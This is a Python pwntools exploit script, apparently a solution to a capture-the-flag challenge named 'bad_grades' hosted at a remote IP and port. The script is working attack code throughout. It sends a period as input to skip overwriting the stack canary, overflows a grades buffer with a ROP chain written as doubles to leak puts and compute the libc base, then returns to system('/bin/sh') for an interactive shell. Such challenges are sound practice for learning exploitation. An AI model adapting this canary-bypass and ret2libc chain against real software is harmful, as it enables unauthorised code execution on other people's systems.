#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './bad_grades'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port  = '178.128.45.143', 32701 

def start(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# https://stackoverflow.com/questions/1592158/convert-hex-to-float
def convertToDouble(adrr):
    payload = p64(adrr).hex()
    payload = struct.unpack('d', bytes.fromhex(payload))[0]
    return str(payload).encode()

# =========================================================
#                         EXPLOITS
# =========================================================
io = start()
rop = ROP(exe)

# 1ST PHASE LEAK LIBC
io.sendlineafter(b'>', b'2')
io.sendlineafter(b'Number of grades:', b'40' )

for i in range(33):
    io.sendlineafter(b':', b'1')

# where if we input a dot/period, the input will be skipped and variable a will retain its original value. 
# Using this concept, we use dot/period so that the canary will not be overwritten when buffer overflow occurs.
io.sendlineafter(b':', b'.')                                # grades[34] to bypass canary
io.sendlineafter(b':', b'1')                                # grades[35] junk RBP
                                
io.sendlineafter(b':', convertToDouble(rop.rdi.address))
io.sendlineafter(b':', convertToDouble(elf.got['puts']))
io.sendlineafter(b':', convertToDouble(elf.plt['puts']))
io.sendlineafter(b':', convertToDouble(0x400fd5))
io.sendlineafter(b':', b'1')                                # grades[40] 

# RECEIVING LEAK INFORMATION
io.recvline()
puts = unpack(io.recvline()[:-1].ljust(8, b'\x00'))
libc.address = puts - libc.sym['puts']
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

info('GOT-puts: %#x', puts)
info('libc base: %#x', libc.address)
info('binsh: %#x', binsh)
info('system: %#x', system)

# 2ND PHASE, GET SHELL
io.sendlineafter(b'Number of grades:', b'40' )

for i in range(33):
    io.sendlineafter(b':', b'1')
io.sendlineafter(b':', b'.') 
io.sendlineafter(b':', b'1')   

io.sendlineafter(b':', convertToDouble(rop.ret.address))
io.sendlineafter(b':', convertToDouble(rop.rdi.address))
io.sendlineafter(b':', convertToDouble(binsh))
io.sendlineafter(b':', convertToDouble(system))
io.sendlineafter(b':', b'1')

io.interactive()